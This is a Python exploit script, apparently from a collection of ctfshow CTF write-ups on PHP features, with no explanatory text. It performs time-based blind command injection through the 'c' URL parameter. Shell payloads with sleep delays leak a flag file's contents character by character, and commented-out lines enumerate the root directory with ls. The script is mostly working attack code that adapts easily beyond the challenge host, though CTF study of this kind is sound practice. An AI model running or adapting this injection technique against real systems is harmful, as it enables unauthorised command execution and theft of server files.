# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/WP汇总/ctfshow-php特性.md
# TITLE: ctfshow-php特性
# CATEGORY: web

import requests
url="http://7b5658de-1c24-4882-9d46-8bbf2a122364.challenge.ctf.show:8080/?c="
re=""
for j in range(1,50):
    for k in range(32,128):
        k=chr(k)
        # payload = f"if[`ls / | awk NR=={i} | cut -c {j}`=={k} ];then sleep 2;fi"
        # payload = "?c=" + f"if [ `ls / | awk NR=={i} | cut -c {j}` == {k} ];then sleep 2;fi"
        # print(payload)
        payload ="if [ `cat /f149_15_h3r3 | cut -c {0}` == {1} ];then sleep 2;fi".format(j,k)
        try:
            requests.get(url+payload,timeout=(1.5,1.5))
        except:
            re=re+k
            print(re)
            break
